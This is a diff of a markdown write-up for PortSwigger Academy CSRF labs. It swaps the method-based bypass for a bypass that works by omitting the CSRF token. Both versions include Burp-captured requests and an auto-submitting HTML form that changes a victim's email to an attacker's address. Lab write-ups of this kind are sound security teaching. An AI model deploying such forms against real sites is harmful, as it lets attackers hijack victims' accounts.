@@ -1,8 +1,10 @@
-# CSRF Where Token Validation Depends on Request Method
+# CSRF where token validation depends on token being present
 
-## Overview
+## Lab Description
 
-This lab demonstrates a **Cross-Site Request Forgery (CSRF)** vulnerability where the application validates the CSRF token for a `POST` request but fails to enforce the same protection when the request is changed to `GET`.
+This lab demonstrates a Cross-Site Request Forgery (CSRF) vulnerability where the application uses a CSRF token for protection, but the server only validates the token when the token parameter is present.
+
+By removing the CSRF token parameter completely from the request, the validation can be bypassed.
 
 The vulnerable functionality allows an authenticated user to change their email address.
 
@@ -14,18 +16,19 @@ The vulnerable endpoint is:
 /my-account/change-email
 ```
 
-A normal email-change request uses the `POST` method and includes a CSRF token:
+A normal email-change request contains a CSRF token:
 
 ```http
 POST /my-account/change-email HTTP/2
+Host: <LAB-ID>.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
-email=example@gmail.com&csrf=<CSRF_TOKEN>
+email=test@example.com&csrf=<CSRF_TOKEN>
 ```
 
-When attempting to perform the request without a valid CSRF token using the normal `POST` method, the application rejects the request.
+The application validates the CSRF token when the `csrf` parameter is included.
 
-However, the application does not properly enforce CSRF protection when the same endpoint is accessed using the `GET` method.
+However, if the entire `csrf` parameter is removed, the application does not perform the validation and still processes the request.
 
 ## Steps to Reproduce
 
@@ -39,27 +42,31 @@ Navigate to:
 /my-account
 ```
 
-The account page contains the functionality to change the user's email address.
+The account page contains the functionality to change the email address.
 
 ### 2. Capture the Email Change Request
 
-Change the email address and intercept the request using Burp Suite.
+Use Burp Suite to intercept the request generated when changing the email address.
 
-The request looks similar to:
+The request contains:
 
 ```http
 POST /my-account/change-email HTTP/2
 Host: <LAB-ID>.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
-email=example@gmail.com&csrf=<CSRF_TOKEN>
+email=test@example.com&csrf=<CSRF_TOKEN>
 ```
 
-The request contains a CSRF token.
+The important parameter is:
 
-### 3. Test CSRF Token Validation
+```text
+csrf=<CSRF_TOKEN>
+```
 
-Send the request to Burp Repeater and remove the CSRF token.
+### 3. Test the CSRF Token
+
+Send the request to Burp Repeater and modify the CSRF token.
 
 For example:
 
@@ -68,38 +75,40 @@ POST /my-account/change-email HTTP/2
 Host: <LAB-ID>.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
-email=test@gmail.com
+email=test@example.com&csrf=invalid
 ```
 
-The application rejects the request because the `POST` request requires a valid CSRF token.
+The application rejects the request because the supplied token is invalid.
 
-### 4. Change the Request Method
+This indicates that the application performs CSRF validation when the `csrf` parameter is present.
 
-Modify the request from:
+### 4. Remove the CSRF Parameter
+
+Remove the entire `csrf` parameter instead of replacing it with an invalid value.
+
+The request becomes:
 
 ```http
-POST /my-account/change-email
+POST /my-account/change-email HTTP/2
+Host: <LAB-ID>.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+email=test@example.com
 ```
 
-to:
+The application accepts the request.
 
-```http
-GET /my-account/change-email
-```
-
-The application accepts the request even though the CSRF token is not supplied.
-
-This demonstrates that CSRF protection depends on the HTTP request method.
+This confirms that CSRF validation is only performed when the token parameter is present.
 
 ## Exploit
 
-Create an HTML page that automatically submits a request to the vulnerable endpoint.
+Create a malicious HTML page that submits the email-change request without including a CSRF token.
 
 ```html
 <html>
 <body>
 
-<form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="GET">
+<form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
     <input type="hidden" name="email" value="attacker@gmail.com">
 </form>
 
@@ -111,63 +120,98 @@ Create an HTML page that automatically submits a request to the vulnerable endpo
 </html>
 ```
 
-Replace `<LAB-ID>` with the actual lab domain.
+Notice that the form contains no:
 
-Replace `attacker@gmail.com` with the email address specified by the lab.
+```html
+<input type="hidden" name="csrf" value="...">
+```
 
-## Exploitation
+This is intentional because the application does not require the CSRF token when the parameter is absent.
 
-1. Open the PortSwigger Exploit Server.
-2. Paste the exploit HTML into the response body.
-3. Click **Store**.
-4. Click **Deliver exploit to victim**.
-5. The victim's browser automatically sends the `GET` request.
-6. The application processes the request using the victim's authenticated session.
-7. The victim's email address is changed.
+## Delivering the Exploit
+
+Place the HTML payload on the PortSwigger Exploit Server.
+
+Store the exploit and select:
+
+**Deliver exploit to victim**
+
+When the victim visits the exploit page, the form is automatically submitted.
+
+The victim's browser sends the request using the victim's authenticated session.
+
+The request contains:
+
+```http
+POST /my-account/change-email HTTP/2
+
+email=attacker@gmail.com
+```
+
+Because the `csrf` parameter is completely absent, the vulnerable application does not perform CSRF token validation.
 
 ## Why the Attack Works
 
-The application incorrectly assumes that CSRF protection only needs to be applied to the `POST` version of the endpoint.
-
-The attacker changes the request method from `POST` to `GET`.
-
-The server then processes the state-changing request without requiring a valid CSRF token.
-
-The vulnerability can therefore be summarized as:
+The application's CSRF validation logic effectively behaves like:
 
 ```text
-POST request
-    ↓
-CSRF token required
-    ↓
-Request rejected without token
+CSRF parameter present?
+        |
+       Yes
+        |
+        v
+Validate CSRF token
+        |
+        v
+Valid token → Process request
+Invalid token → Reject request
 
-GET request
-    ↓
-CSRF token not enforced
-    ↓
-Email changed
+CSRF parameter absent
+        |
+        v
+No validation
+        |
+        v
+Process request
 ```
+
+The security check should instead reject the request whenever a valid CSRF token is not supplied.
+
+The attacker takes advantage of the difference between:
+
+```text
+csrf=invalid
+```
+
+and:
+
+```text
+csrf parameter completely absent
+```
+
+The first is rejected, while the second is accepted.
+
+## Result
+
+The victim's email address is changed to the attacker-controlled email address.
+
+This confirms that the CSRF protection can be bypassed by omitting the CSRF token parameter entirely.
 
 ## Key Learning
 
-- CSRF protection must be consistently enforced on all state-changing requests.
-- Changing the HTTP method should not bypass CSRF validation.
-- `GET` requests should not normally be used for state-changing operations.
-- CSRF tokens should be validated server-side for every request that changes user data.
-- Burp Suite Repeater can be used to test whether changing the HTTP method bypasses security controls.
-- A vulnerable state-changing `GET` endpoint can allow an attacker to perform actions using the victim's authenticated session.
-
-## Tools Used
-
-- Burp Suite Community Edition
-- PortSwigger Web Security Academy
-- Burp Suite Repeater
-- PortSwigger Exploit Server
-- Firefox
+- CSRF tokens must be mandatory for protected state-changing requests.
+- Removing a security parameter should never cause validation to be skipped.
+- Applications should reject requests when the CSRF token is missing.
+- Invalid and missing CSRF tokens should both result in request rejection.
+- Server-side validation must explicitly check that a CSRF token exists before validating its value.
+- Burp Suite Repeater is useful for testing differences between missing, invalid, and valid security parameters.
 
 ## Conclusion
 
-The lab demonstrates a CSRF vulnerability caused by inconsistent CSRF token validation based on the HTTP request method.
+The lab was solved by identifying that the application only validates the CSRF token when the `csrf` parameter is present.
 
-Although the application protects the email-change functionality when accessed through `POST`, it fails to apply the same protection to `GET`. An attacker can exploit this behavior by creating a malicious page that automatically sends a `GET` request to the vulnerable endpoint, causing the authenticated victim's email address to be changed.
+An invalid CSRF token is rejected, but completely removing the token causes the application to skip validation and accept the state-changing request.
+
+A malicious HTML form can therefore omit the CSRF token and force an authenticated victim to change their email address.
+
+The vulnerability can be prevented by making the CSRF token mandatory and rejecting every state-changing request where the token is missing or invalid.
